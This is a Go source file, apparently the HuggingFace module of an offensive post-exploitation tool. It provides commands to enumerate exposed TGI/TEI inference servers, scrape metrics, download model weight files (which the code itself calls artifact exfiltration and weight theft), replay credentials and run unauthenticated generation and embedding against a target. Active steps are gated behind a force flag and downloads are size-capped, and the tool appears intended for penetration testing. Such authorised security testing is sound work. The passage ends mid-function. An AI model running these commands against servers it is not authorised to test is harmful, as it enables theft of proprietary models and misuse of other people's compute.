package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/spf13/cobra"

	"github.com/professor-moody/aipostex/internal/inferenceprobe"
	exploitcommon "github.com/professor-moody/aipostex/pkg/exploit/common"
	"github.com/professor-moody/aipostex/pkg/exploit/huggingface"
	"github.com/professor-moody/aipostex/pkg/report"
)

var (
	hfTarget    string
	hfHeaders   []string
	hfPrompt    string
	hfMaxTokens int
	hfInputs    []string

	hfModelID          string
	hfRevision         string
	hfDownloadFiles    []string
	hfDownloadMax      int
	hfDownloadMaxBytes int64
	hfDownloadPerFile  int64
	hfDownloadDir      string
	hfHubBase          string
	hfHubHeaders       []string
)

var huggingfaceCmd = &cobra.Command{
	Use:   "huggingface",
	Short: "Enumerate and exploit HuggingFace TGI/TEI inference servers",
	Long: `Post-exploitation module for HuggingFace Text Generation Inference (TGI)
and Text Embeddings Inference (TEI) servers.

TGI serves generative language models; TEI serves embedding and reranking models.
The enum subcommand auto-detects the service type from the /info endpoint.

Examples:
  aipostex huggingface --target http://10.0.0.50:8080 enum
  aipostex huggingface --target http://10.0.0.50:8080 models
  aipostex huggingface --target http://10.0.0.50:8080 metrics
  aipostex huggingface --target http://10.0.0.50:8080 model-download --force-exploit
  aipostex huggingface --target http://10.0.0.50:8080 generate --prompt "Hello" --force-exploit
  aipostex huggingface --target http://10.0.0.50:8080 embed --inputs "test sentence" --force-exploit`,
	Example: strings.Join([]string{
		formatCommandExample("huggingface --target http://127.0.0.1:8080 enum"),
		formatCommandExample("huggingface --target http://127.0.0.1:8080 models"),
		formatCommandExample("huggingface --target http://127.0.0.1:8080 model-download --force-exploit"),
		formatCommandExample("huggingface --target http://127.0.0.1:8080 generate --prompt \"Hello\" --force-exploit"),
	}, "\n"),
}

var hfEnumCmd = &cobra.Command{
	Use:     "enum",
	Short:   "Enumerate HuggingFace TGI/TEI service type and model info",
	Example: formatCommandExample("huggingface --target http://127.0.0.1:8080 enum"),
	RunE:    runHFEnum,
}

var hfModelsCmd = &cobra.Command{
	Use:     "models",
	Short:   "List models served by a TGI instance via /v1/models",
	Example: formatCommandExample("huggingface --target http://127.0.0.1:8080 models"),
	RunE:    runHFModels,
}

var hfMetricsCmd = &cobra.Command{
	Use:     "metrics",
	Short:   "Extract Prometheus metrics from the /metrics endpoint",
	Example: formatCommandExample("huggingface --target http://127.0.0.1:8080 metrics"),
	RunE:    runHFMetrics,
}

var hfModelDownloadCmd = &cobra.Command{
	Use:   "model-download",
	Short: "Download bounded model files from Hub-compatible storage (gated)",
	Long: `Resolve the served model ID from /info (or use --model-id) and download capped
chunks of candidate files from a Hugging Face Hub-compatible
/<model>/resolve/<revision>/<file> path.

This is an active artifact exfiltration action and requires --force-exploit.`,
	Example: formatCommandExample("huggingface --target http://127.0.0.1:8080 model-download --max-bytes 1048576 --output-dir ./hf-model --force-exploit"),
	RunE:    runHFModelDownload,
}

var hfGenerateCmd = &cobra.Command{
	Use:   "generate",
	Short: "Send a text generation request to a TGI server (gated)",
	Long: `Send a generation request to a TGI /generate endpoint.

This is an active exploit action and requires --force-exploit.`,
	Example: formatCommandExample("huggingface --target http://127.0.0.1:8080 generate --prompt \"Hello\" --force-exploit"),
	RunE:    runHFGenerate,
}

var hfEmbedCmd = &cobra.Command{
	Use:   "embed",
	Short: "Send an embedding request to a TEI server (gated)",
	Long: `Send an embed request to a TEI /embed endpoint.

This is an active exploit action and requires --force-exploit.`,
	Example: formatCommandExample("huggingface --target http://127.0.0.1:8080 embed --inputs \"test\" --force-exploit"),
	RunE:    runHFEmbed,
}

func init() {
	huggingfaceCmd.PersistentFlags().StringVarP(&hfTarget, "target", "t", "", "HuggingFace TGI/TEI URL (required)")
	huggingfaceCmd.PersistentFlags().StringSliceVar(&hfHeaders, "header", nil, "Additional HTTP header(s)")

	hfModelDownloadCmd.Flags().StringVar(&hfModelID, "model-id", "", "Model ID to download; defaults to /info model_id")
	hfModelDownloadCmd.Flags().StringVar(&hfRevision, "revision", "main", "Hub revision to download")
	hfModelDownloadCmd.Flags().StringSliceVar(&hfDownloadFiles, "files", defaultHFModelDownloadFiles(), "Candidate model files to download")
	hfModelDownloadCmd.Flags().IntVar(&hfDownloadMax, "max-files", 6, "Maximum candidate files to attempt")
	hfModelDownloadCmd.Flags().Int64Var(&hfDownloadMaxBytes, "max-bytes", 1024*1024, "Maximum total bytes to download")
	hfModelDownloadCmd.Flags().Int64Var(&hfDownloadPerFile, "per-file-bytes", 256*1024, "Maximum bytes to read from each file")
	hfModelDownloadCmd.Flags().StringVar(&hfDownloadDir, "output-dir", "", "Optional directory for saved model file chunks")
	hfModelDownloadCmd.Flags().StringVar(&hfHubBase, "hub-base", "", "Hub-compatible base URL (default: --target)")
	hfModelDownloadCmd.Flags().StringSliceVar(&hfHubHeaders, "hub-header", nil, "Additional Hub HTTP header(s)")

	hfGenerateCmd.Flags().StringVar(&hfPrompt, "prompt", "", "Text prompt to send (required)")
	hfGenerateCmd.Flags().IntVar(&hfMaxTokens, "max-tokens", 50, "Maximum tokens to generate")
	hfEmbedCmd.Flags().StringSliceVar(&hfInputs, "inputs", nil, "Input texts to embed (required)")

	huggingfaceCmd.AddCommand(hfEnumCmd, hfModelsCmd, hfMetricsCmd, hfModelDownloadCmd, hfGenerateCmd, hfEmbedCmd)
}

func newHFClient() (*huggingface.Client, error) {
	if strings.TrimSpace(hfTarget) == "" {
		return nil, missingFlagError("target", formatCommandExample("huggingface --target http://127.0.0.1:8080 enum"))
	}
	headers, err := exploitcommon.ParseHeaderFlags(hfHeaders)
	if err != nil {
		return nil, err
	}
	target := normalizeAndWarnTarget(hfTarget)
	hfTarget = target
	client, err := huggingface.NewClient(currentContext(), target, cfg.Timeout, headers)
	if err != nil {
		return nil, err
	}
	httpClient, err := cfg.NewHTTPClient()
	if err != nil {
		return nil, err
	}
	client.HTTPClient = httpClient
	return client, nil
}

// newHFControlClient builds a Generate client that deliberately OMITS any
// credential (strips Authorization). It powers the no-credential control probe
// that separates a credential replay against a gated TGI gateway from an open,
// unauthenticated server.
func newHFControlClient() (*huggingface.Client, error) {
	headers, err := exploitcommon.ParseHeaderFlags(hfHeaders)
	if err != nil {
		return nil, err
	}
	if headers != nil {
		headers.Del("Authorization")
	}
	client, err := huggingface.NewClient(currentContext(), hfTarget, cfg.Timeout, headers)
	if err != nil {
		return nil, err
	}
	httpClient, err := cfg.NewHTTPClient()
	if err != nil {
		return nil, err
	}
	client.HTTPClient = httpClient
	return client, nil
}

func runHFEnum(_ *cobra.Command, _ []string) error {
	client, err := newHFClient()
	if err != nil {
		return err
	}
	info, err := client.Enumerate()
	if err != nil {
		return fmt.Errorf("enumerating huggingface: %w", err)
	}

	// Bare service enumeration is recon/reachable — Info, matching the other inference
	// modules (triton/bentoml/tfserving/torchserve). The API answering with a model name
	// is not itself an exposed capability; reserve higher severity for a concrete finding.
	severity := report.SeverityInfo

	finding := newExploitFinding(
		report.SourceHuggingFace,
		hfTarget,
		fmt.Sprintf("HuggingFace %s service enumerated", strings.ToUpper(string(info.ServiceType))),
		severity,
		fmt.Sprintf("Service type=%s model=%s version=%s (reachable=%t)",
			info.ServiceType, safeLabel(info.ModelID), safeLabel(info.Version), info.Reachable),
		map[string]interface{}{
			"module":       "huggingface",
			"action":       "enum",
			"mutating":     false,
			"provider":     "huggingface",
			"service_type": string(info.ServiceType),
			"model_id":     info.ModelID,
			"version":      info.Version,
			"reachable":    info.Reachable,
		},
	)
	finding.Metadata = applyStageLanded(finding.Metadata, "recon", "reachable", "huggingface-enum", "server")

	var recs []workflowRecommendation
	switch info.ServiceType {
	case huggingface.ServiceTGI:
		recs = []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("huggingface --target "+hfTarget+" models"), "List TGI served models via /v1/models.", false, 10),
			newWorkflowRecommendation(formatCommandExample("huggingface --target "+hfTarget+" metrics"), "Extract Prometheus metrics.", false, 20),
			hfModelDownloadRecommendation(hfTarget, info.ModelID, 25),
			newWorkflowRecommendation(formatCommandExample("huggingface --target "+hfTarget+" generate --prompt \"Hello\" --force-exploit"), "Test unauthenticated generation access.", true, 30),
		}
	case huggingface.ServiceTEI:
		recs = []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("huggingface --target "+hfTarget+" metrics"), "Extract Prometheus metrics.", false, 10),
			hfModelDownloadRecommendation(hfTarget, info.ModelID, 15),
			newWorkflowRecommendation(formatCommandExample("huggingface --target "+hfTarget+" embed --inputs \"test\" --force-exploit"), "Test unauthenticated embedding access.", true, 20),
		}
	default:
		recs = []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("huggingface --target "+hfTarget+" metrics"), "Try metrics endpoint.", false, 10),
			hfModelDownloadRecommendation(hfTarget, info.ModelID, 20),
		}
	}

	enumPlan := workflowPlan{
		Target:          hfTarget,
		Stage:           "enum",
		Rationale:       "HuggingFace inference server discovery should progress into model identification, metrics extraction, and inference access testing.",
		Recommendations: recs,
	}
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, enumPlan)

	infof("Enumerated HuggingFace server (type=%s model=%s)", info.ServiceType, safeLabel(info.ModelID))
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "huggingface",
		Action:              "enum",
		ResourcesEnumerated: 1,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{enumPlan},
	})
}

func runHFModels(_ *cobra.Command, _ []string) error {
	client, err := newHFClient()
	if err != nil {
		return err
	}
	models, err := client.Models()
	if err != nil {
		return fmt.Errorf("listing HuggingFace models: %w", err)
	}

	findings := make([]report.Finding, 0, len(models))
	for _, m := range models {
		findings = append(findings, newExploitFinding(
			report.SourceHuggingFace,
			hfTarget,
			fmt.Sprintf("HuggingFace TGI model: %s", m),
			report.SeverityHigh,
			fmt.Sprintf("Model %q served via TGI /v1/models", m),
			map[string]interface{}{
				"module":   "huggingface",
				"action":   "models",
				"mutating": false,
				"provider": "huggingface",
				"model_id": m,
			},
		))
	}

	if len(findings) == 0 {
		findings = append(findings, newExploitFinding(
			report.SourceHuggingFace,
			hfTarget,
			"HuggingFace TGI models: none listed",
			report.SeverityInfo,
			"No models returned from /v1/models",
			map[string]interface{}{
				"module":   "huggingface",
				"action":   "models",
				"mutating": false,
				"provider": "huggingface",
			},
		))
	}

	firstModel := ""
	if len(models) > 0 {
		firstModel = models[0]
	}
	plan := buildHFExploitWorkflowPlan(hfTarget, "models", firstModel)
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, plan)

	infof("Listed %d HuggingFace TGI model(s)", len(models))
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "huggingface",
		Action:              "models",
		ResourcesEnumerated: len(models),
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

func runHFMetrics(_ *cobra.Command, _ []string) error {
	client, err := newHFClient()
	if err != nil {
		return err
	}
	raw, err := client.Metrics()
	if err != nil {
		return fmt.Errorf("fetching HuggingFace metrics: %w", err)
	}

	lines := strings.Split(raw, "\n")
	var metricLines []string
	for _, l := range lines {
		if strings.HasPrefix(l, "tgi_") || strings.HasPrefix(l, "te_") {
			metricLines = append(metricLines, l)
		}
	}

	finding := newExploitFinding(
		report.SourceHuggingFace,
		hfTarget,
		"HuggingFace metrics exposed",
		report.SeverityMedium,
		fmt.Sprintf("Prometheus metrics endpoint accessible (%d metric lines)", len(metricLines)),
		map[string]interface{}{
			"module":       "huggingface",
			"action":       "metrics",
			"mutating":     false,
			"provider":     "huggingface",
			"metric_lines": len(metricLines),
		},
	)
	finding.Evidence = raw

	plan := buildHFExploitWorkflowPlan(hfTarget, "metrics", "")
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, plan)

	infof("Fetched HuggingFace metrics (%d lines)", len(lines))
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "huggingface",
		Action:              "metrics",
		ResourcesEnumerated: 1,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

func runHFModelDownload(_ *cobra.Command, _ []string) error {
	if err := requireForceExploit("huggingface model-download"); err != nil {
		return err
	}
	client, err := newHFClient()
	if err != nil {
		return err
	}

	modelID := strings.TrimSpace(hfModelID)
	if modelID == "" {
		info, err := client.Enumerate()
		if err != nil {
			return fmt.Errorf("resolving HuggingFace model id from /info: %w", err)
		}
		modelID = strings.TrimSpace(info.ModelID)
	}
	if modelID == "" {
		return missingFlagError("model-id", formatCommandExample("huggingface --target http://127.0.0.1:8080 model-download --model-id org/model --force-exploit"))
	}

	hubHeaders, err := exploitcommon.ParseHeaderFlags(hfHubHeaders)
	if err != nil {
		return err
	}
	result, err := client.DownloadModelFiles(modelID, hfRevision, effectiveHFHubBase(), hfDownloadFiles, hfDownloadMax, hfDownloadMaxBytes, hfDownloadPerFile, hubHeaders)
	if err != nil {
		return fmt.Errorf("downloading HuggingFace model files: %w", err)
	}
	savedByName, savedPaths, err := writeHFModelDownloadFiles(hfDownloadDir, modelID, result.Files)
	if err != nil {
		return err
	}

	findings := make([]report.Finding, 0, result.FilesRead+1)
	strongest := "reachable"
	for _, file := range result.Files {
		if file.BytesRead == 0 {
			continue
		}
		kind, hints, _ := classifyArtifactPreview(file.Name, string(file.Bytes))
		landed := hfModelDownloadLanded(file.Name, kind)
		if hfLandedRank(landed) > hfLandedRank(strongest) {
			strongest = landed
		}
		severity := hfModelDownloadSeverity(landed)
		saved := savedByName[file.Name]
		finding := newExploitFinding(
			report.SourceHuggingFace,
			hfTarget,
			fmt.Sprintf("HuggingFace model file downloaded: %s", safeLabel(file.Name)),
			severity,
			fmt.Sprintf("Downloaded %s for model %s (%s read, truncated=%t)", safeLabel(file.Name), safeLabel(modelID), humanBytes(file.BytesRead), file.Truncated),
			map[string]interface{}{
				"module":             "huggingface",
				"action":             "model-download",
				"mutating":           false,
				"provider":           "huggingface",
				"model_id":           modelID,
				"revision":           result.Revision,
				"hub_base":           result.HubBase,
				"artifact_path":      file.Name,
				"artifact_kind":      kind,
				"sensitivity_hints":  strings.Join(hints, ","),
				"bytes_read":         file.BytesRead,
				"evidence_truncated": file.Truncated,
			},
		)
		if saved != "" {
			finding.Metadata["saved_file"] = saved
		}
		finding.Evidence = hfModelDownloadEvidence(file, saved)
		finding.Metadata = applyStageLanded(finding.Metadata, "impact", landed, "huggingface-model-download", "model-artifact-read")
		finding.Metadata = attachWorkflowToMetadata(finding.Metadata, buildHFModelDownloadWorkflowPlan(hfTarget, modelID))
		findings = append(findings, finding)
	}

	stage := "impact"
	severity := hfModelDownloadSeverity(strongest)
	title := fmt.Sprintf("HuggingFace model download summary: %d file(s)", result.FilesRead)
	description := fmt.Sprintf("Downloaded %d candidate file(s) for model %s from %s (%s total, %d failure(s)).", result.FilesRead, safeLabel(modelID), result.HubBase, humanBytes(result.BytesRead), result.Failures)
	if result.FilesRead == 0 {
		stage = "recon"
		severity = report.SeverityInfo
		title = fmt.Sprintf("HuggingFace model download not confirmed: %s", safeLabel(modelID))
		description = fmt.Sprintf("No candidate model files were downloaded from %s for model %s; endpoint discovery remains reachable only.", result.HubBase, safeLabel(modelID))
	}
	summary := newExploitFinding(
		report.SourceHuggingFace,
		hfTarget,
		title,
		severity,
		description,
		map[string]interface{}{
			"module":          "huggingface",
			"action":          "model-download",
			"mutating":        false,
			"provider":        "huggingface",
			"model_id":        modelID,
			"revision":        result.Revision,
			"hub_base":        result.HubBase,
			"files_found":     result.FilesRead,
			"bytes_read":      result.BytesRead,
			"total_bytes":     result.BytesRead,
			"failures":        result.Failures,
			"max_bytes":       hfDownloadMaxBytes,
			"per_file":        hfDownloadPerFile,
			"file_candidates": len(result.Files),
		},
	)
	if strings.TrimSpace(hfDownloadDir) != "" {
		summary.Metadata["output_dir"] = filepath.Join(hfDownloadDir, hfSafeFilePart(modelID))
	}
	if len(savedPaths) > 0 {
		summary.Metadata["saved_files"] = strings.Join(savedPaths, ",")
	}
	summary.Evidence = hfModelDownloadSummaryEvidence(result)
	summary.Metadata = applyStageLanded(summary.Metadata, stage, strongest, "huggingface-model-download", "model-artifact-read")
	plan := buildHFModelDownloadWorkflowPlan(hfTarget, modelID)
	summary.Metadata = attachWorkflowToMetadata(summary.Metadata, plan)
	findings = append(findings, summary)

	infof("HuggingFace model-download complete: model=%s files=%d bytes=%s failures=%d", modelID, result.FilesRead, humanBytes(result.BytesRead), result.Failures)
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "huggingface",
		Action:              "model-download",
		ResourcesEnumerated: result.FilesRead,
		PartialFailures:     result.Failures,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

func defaultHFModelDownloadFiles() []string {
	return []string{
		"config.json",
		"tokenizer.json",
		"tokenizer_config.json",
		"generation_config.json",
		"model.safetensors",
		"pytorch_model.bin",
	}
}

func hfModelDownloadRecommendation(target, modelID string, priority int) workflowRecommendation {
	cmd := "huggingface --target " + target + " model-download"
	if strings.TrimSpace(modelID) != "" {
		cmd += " --model-id " + shellSafeArg(modelID)
	}
	cmd += " --force-exploit"
	return hfImpactWorkflowRecommendation(cmd, "Download bounded model metadata/weight chunks from Hub-compatible storage when the served model ID is recoverable.", true, priority)
}

func effectiveHFHubBase() string {
	if strings.TrimSpace(hfHubBase) != "" {
		return strings.TrimSpace(hfHubBase)
	}
	return canonicalServiceURL(hfTarget)
}

func hfImpactWorkflowRecommendation(command, rationale string, gated bool, priority int) workflowRecommendation {
	rec := newWorkflowRecommendation(formatCommandExample(command), rationale, gated, priority)
	rec.Stage = "impact"
	return rec
}

func buildHFModelDownloadWorkflowPlan(target, _ string) workflowPlan {
	return workflowPlan{
		Target:      canonicalServiceURL(target),
		Stage:       "impact",
		ChainSource: "huggingface-model-download",
		Rationale:   "Model file reads should feed back into service interaction: inspect metrics and verify whether generation or embedding access also lands.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("huggingface --target "+canonicalServiceURL(target)+" metrics"), "Scrape metrics after model file access to capture service limits and request counters.", false, 10),
			hfImpactWorkflowRecommendation("huggingface --target "+canonicalServiceURL(target)+" generate --prompt \"Hello\" --force-exploit", "For TGI, test whether the served model will execute inference.", true, 20),
			hfImpactWorkflowRecommendation("huggingface --target "+canonicalServiceURL(target)+" embed --inputs \"test\" --force-exploit", "For TEI, test whether the served model will compute embeddings.", true, 30),
		},
	}
}

func hfModelDownloadLanded(fileName, kind string) string {
	lower := strings.ToLower(strings.TrimSpace(fileName))
	switch {
	case kind == "model-artifact":
		return "takeover-capable"
	case strings.HasSuffix(lower, ".safetensors"), strings.HasSuffix(lower, ".bin"), strings.HasSuffix(lower, ".onnx"), strings.HasSuffix(lower, ".pt"), strings.HasSuffix(lower, ".pkl"):
		return "takeover-capable"
	default:
		return "read-confirmed"
	}
}

func hfModelDownloadSeverity(landed string) string {
	switch landed {
	case "takeover-capable":
		return report.SeverityCritical
	case "read-confirmed":
		return report.SeverityHigh
	default:
		return report.SeverityInfo
	}
}

func hfLandedRank(landed string) int {
	switch landed {
	case "takeover-capable":
		return 5
	case "execution-confirmed":
		return 4
	case "read-confirmed":
		return 3
	case "influenced":
		return 2
	case "reachable":
		return 1
	default:
		return 0
	}
}

func hfModelDownloadEvidence(file huggingface.ModelFileDownload, saved string) string {
	lines := []string{
		fmt.Sprintf("file=%s", file.Name),
		fmt.Sprintf("url=%s", file.URL),
		fmt.Sprintf("status=%d", file.StatusCode),
		fmt.Sprintf("bytes_read=%d", file.BytesRead),
		fmt.Sprintf("truncated=%t", file.Truncated),
	}
	if saved != "" {
		lines = append(lines, "saved="+saved)
	}
	kind, _, _ := classifyArtifactPreview(file.Name, string(file.Bytes))
	if kind == "model-artifact" {
		lines = append(lines, fmt.Sprintf("content=[%d bytes of model artifact data]", len(file.Bytes)))
	} else if len(file.Bytes) > 0 {
		lines = append(lines, "content="+string(file.Bytes))
	}
	return strings.Join(lines, "\n")
}

func hfModelDownloadSummaryEvidence(result huggingface.ModelDownloadResult) string {
	lines := make([]string, 0, len(result.Files)+1)
	for _, file := range result.Files {
		line := fmt.Sprintf("%s status=%d bytes=%d truncated=%t", file.Name, file.StatusCode, file.BytesRead, file.Truncated)
		if file.Error != "" {
			line += " error=" + file.Error
		}
		lines = append(lines, line)
	}
	if len(lines) == 0 {
		lines = append(lines, "no candidate files attempted")
	}
	return strings.Join(lines, "\n")
}

func writeHFModelDownloadFiles(outputDir, modelID string, files []huggingface.ModelFileDownload) (map[string]string, []string, error) {
	savedByName := make(map[string]string)
	if strings.TrimSpace(outputDir) == "" {
		return savedByName, nil, nil
	}
	hasBytes := false
	for _, file := range files {
		if len(file.Bytes) > 0 {
			hasBytes = true
			break
		}
	}
	if !hasBytes {
		return savedByName, nil, nil
	}
	modelDir := filepath.Join(outputDir, hfSafeFilePart(modelID))
	if err := os.MkdirAll(modelDir, 0o700); err != nil {
		return nil, nil, fmt.Errorf("creating HuggingFace model output directory: %w", err)
	}
	var savedPaths []string
	for i, file := range files {
		if len(file.Bytes) == 0 {
			continue
		}
		name := fmt.Sprintf("%02d-%s", i+1, hfSafeFilePart(file.Name))
		path := filepath.Join(modelDir, name)
		if err := os.WriteFile(path, file.Bytes, 0o600); err != nil {
			return nil, nil, fmt.Errorf("writing HuggingFace model file: %w", err)
		}
		savedByName[file.Name] = path
		savedPaths = append(savedPaths, path)
	}
	return savedByName, savedPaths, nil
}

func hfSafeFilePart(value string) string {
	value = strings.TrimSpace(value)
	if value == "" {
		return "unknown"
	}
	var b strings.Builder
	for _, r := range value {
		switch {
		case r >= 'a' && r <= 'z':
			b.WriteRune(r)
		case r >= 'A' && r <= 'Z':
			b.WriteRune(r)
		case r >= '0' && r <= '9':
			b.WriteRune(r)
		case r == '.', r == '_', r == '-':
			b.WriteRune(r)
		default:
			b.WriteByte('_')
		}
	}
	out := strings.Trim(b.String(), "._-")
	if out == "" {
		return "unknown"
	}
	return out
}

func runHFGenerate(_ *cobra.Command, _ []string) error {
	if err := requireForceExploit("huggingface generate"); err != nil {
		return err
	}
	if strings.TrimSpace(hfPrompt) == "" {
		return missingFlagError("prompt", formatCommandExample("huggingface --target http://127.0.0.1:8080 generate --prompt \"Hello\" --force-exploit"))
	}
	client, err := newHFClient()
	if err != nil {
		return err
	}
	result, err := client.Generate(hfPrompt, hfMaxTokens)
	if err != nil {
		return fmt.Errorf("generation request: %w", err)
	}

	severity := report.SeverityHigh
	if !result.Success {
		severity = report.SeverityMedium
	}

	tokenSupplied := false
	for _, h := range hfHeaders {
		if strings.Contains(strings.ToLower(h), "authorization") {
			tokenSupplied = true
			break
		}
	}

	// No-credential control probe: a "credential replay" claim is only honest if
	// the SAME endpoint REJECTS the request without the credential. A supplied
	// Authorization header is NOT itself proof of a gate — an open TGI accepts any
	// (or no) token. Re-run generate with the credential stripped and compare.
	authControlStatus := "skipped"
	credentialGated := false
	if result.Success && tokenSupplied {
		if controlClient, ctrlErr := newHFControlClient(); ctrlErr == nil {
			controlResult, controlErr := controlClient.Generate(hfPrompt, hfMaxTokens)
			switch {
			case controlErr != nil:
				authControlStatus = "error"
			case controlResult.Success:
				authControlStatus = fmt.Sprintf("%d", controlResult.StatusCode) // succeeded without a credential -> open, not gated
			default:
				authControlStatus = fmt.Sprintf("%d", controlResult.StatusCode)
				credentialGated = controlResult.StatusCode == 401 || controlResult.StatusCode == 403
			}
		}
	}

	// Replay is confirmed only when the gateway validated the credential: either it
	// reported a (non-rejection) credential_replay outcome, or the control probe
	// proved the endpoint is gated (rejects without the token). A bare supplied
	// header against an open server is NOT a replay.
	gatewayReportedReplay := result.CredentialReplay != "" &&
		!strings.EqualFold(result.CredentialReplay, "rejected") &&
		!strings.EqualFold(result.CredentialReplay, "none")
	credentialReplay := credentialGated || gatewayReportedReplay

	// Wording must follow the actual outcome: only call it "confirmed"/"successful"
	// when the request actually succeeded; a rejected credential is a failure.
	var title, summary string
	if result.Success {
		summary = fmt.Sprintf("Generation succeeded (status=%d, tokens=%d)", result.StatusCode, len(strings.Fields(result.GeneratedText)))
		if credentialReplay {
			title = "HuggingFace TGI generation via credential replay confirmed"
		} else {
			title = "HuggingFace TGI unauthenticated generation confirmed"
		}
	} else {
		summary = fmt.Sprintf("Generation request rejected (status=%d)", result.StatusCode)
		switch {
		case result.StatusCode == 404:
			// A 404 on /generate is NOT a credential rejection — the route does not exist,
			// so the target is reachable but is not a TGI text-generation server (commonly a
			// TEI embeddings endpoint, which serves /embed). Say that instead of blaming the
			// credential, and point the operator at the right verb.
			summary = "No /generate endpoint (status=404) — target is not a TGI text-generation server (likely TEI embeddings; try `embed`)"
			title = "HuggingFace /generate not found — endpoint is not a TGI server"
		case tokenSupplied:
			title = "HuggingFace TGI rejected the supplied credential"
		default:
			title = "HuggingFace TGI generation attempt rejected"
		}
	}

	metadata := map[string]interface{}{
		"module":              "huggingface",
		"action":              "generate",
		"mutating":            true,
		"provider":            "huggingface",
		"prompt":              hfPrompt,
		"success":             result.Success,
		"status":              result.StatusCode,
		"credential_gated":    credentialGated,
		"auth_control_status": authControlStatus,
	}
	if result.CredentialReplay != "" {
		metadata["credential_replay"] = result.CredentialReplay
	}
	if result.Inference != "" {
		metadata["inference"] = result.Inference
	}

	finding := newExploitFinding(
		report.SourceHuggingFace,
		hfTarget,
		title,
		severity,
		summary,
		metadata,
	)
	evidence := fmt.Sprintf("prompt=%q status=%d success=%t response=%q", hfPrompt, result.StatusCode, result.Success, result.GeneratedText)
	if result.CredentialReplay != "" {
		evidence += fmt.Sprintf(" credential_replay=%q", result.CredentialReplay)
	}
	if result.Inference != "" {
		evidence += fmt.Sprintf(" inference=%q", result.Inference)
	}
	if authControlStatus != "skipped" {
		evidence += fmt.Sprintf(" credential_gated=%t auth_control_status=%s", credentialGated, authControlStatus)
	}
	finding.Evidence = evidence
	if result.Success {
		// Inference reality probe — do NOT trust the server-reported inference:"real" field (a
		// fixture/gateway can lie). Send a mutated prompt and require input-dependent output for
		// execution-confirmed; the `inference` field stays in evidence as an informational claim only.
		probe := inferenceprobe.Verify([]byte(hfPrompt), func(input []byte) (string, int, error) {
			r, e := client.Generate(string(input), hfMaxTokens)
			return r.GeneratedText, r.StatusCode, e
		})
		finding.Metadata["inference_input_dependent"] = probe.Real
		switch {
		case probe.Real:
			finding.Metadata = applyStageLanded(finding.Metadata, "impact", "execution-confirmed", "huggingface-generate", "inference")
		case credentialReplay:
			finding.Metadata = applyStageLanded(finding.Metadata, "impact", "read-confirmed", "huggingface-generate", "credential-replay")
		default:
			finding.Metadata = applyStageLanded(finding.Metadata, "impact", "influenced", "huggingface-generate", "inference")
		}
	}
	plan := buildHFExploitWorkflowPlan(hfTarget, "generate", "")
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, plan)

	infof("Generation request completed (success=%t)", result.Success)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:        "huggingface",
		Action:        "generate",
		Mutating:      true,
		WorkflowPlans: []workflowPlan{plan},
	})
}

func runHFEmbed(_ *cobra.Command, _ []string) error {
	if err := requireForceExploit("huggingface embed"); err != nil {
		return err
	}
	if len(hfInputs) == 0 {
		return missingFlagError("inputs", formatCommandExample("huggingface --target http://127.0.0.1:8080 embed --inputs \"test\" --force-exploit"))
	}
	client, err := newHFClient()
	if err != nil {
		return err
	}
	result, err := client.Embed(hfInputs)
	if err != nil {
		return fmt.Errorf("embed request: %w", err)
	}

	finding := newExploitFinding(
		report.SourceHuggingFace,
		hfTarget,
		"HuggingFace TEI unauthenticated embedding confirmed",
		report.SeverityHigh,
		fmt.Sprintf("Embedding successful: %d input(s), dim=%d", len(hfInputs), len(result.Embedding)),
		map[string]interface{}{
			"module":      "huggingface",
			"action":      "embed",
			"mutating":    false,
			"provider":    "huggingface",
			"input_count": len(hfInputs),
			"dimensions":  len(result.Embedding),
		},
	)
	// Unauthenticated embedding that returned vectors is a landed impact (we drove the
	// model to process our input), not mere reachability.
	finding.Metadata = applyStageLanded(finding.Metadata, "impact", "influenced", "huggingface-embed", "inference")

	plan := buildHFExploitWorkflowPlan(hfTarget, "embed", "")
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, plan)

	infof("Embed request completed (dim=%d)", len(result.Embedding))
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:        "huggingface",
		Action:        "embed",
		Mutating:      true,
		WorkflowPlans: []workflowPlan{plan},
	})
}

// buildHFExploitWorkflowPlan emits follow-ons for the huggingface serving verbs,
// chaining each to an existing verb that deepens what it found (model enumeration,
// bounded model-file download, and the TGI/TEI inference surfaces). modelID is a
// discovered served model id ("" when none); the gated model-download step carries
// it when known and otherwise omits --model-id (the verb resolves it from /info),
// so a --force-exploit command never carries a "<model>" placeholder.
func buildHFExploitWorkflowPlan(target, action, modelID string) workflowPlan {
	target = canonicalServiceURL(target)
	base := "huggingface --target " + target + " "
	m := shellSafeArg(modelID)
	known := modelID != ""
	var rationale string
	var recs []workflowRecommendation
	switch action {
	case "models":
		rationale = "Served model identifiers anchor bounded model-file download (weight theft) and inference testing."
		if known {
			recs = append(recs, newWorkflowRecommendation(formatCommandExample(base+"model-download --model-id "+m+" --force-exploit"), "Download capped model files (config + weights) for the discovered model.", true, 10))
		}
		recs = append(recs,
			newWorkflowRecommendation(formatCommandExample(base+"generate --prompt 'Hello' --force-exploit"), "Test unauthenticated text generation against the served model.", true, 20),
			newWorkflowRecommendation(formatCommandExample(base+"metrics"), "Extract Prometheus metrics for served-model telemetry.", false, 30),
		)
	case "metrics":
		rationale = "An exposed metrics endpoint confirms reachability; pivot into model enumeration and inference."
		recs = append(recs,
			newWorkflowRecommendation(formatCommandExample(base+"models"), "List served model identifiers via /v1/models.", false, 10),
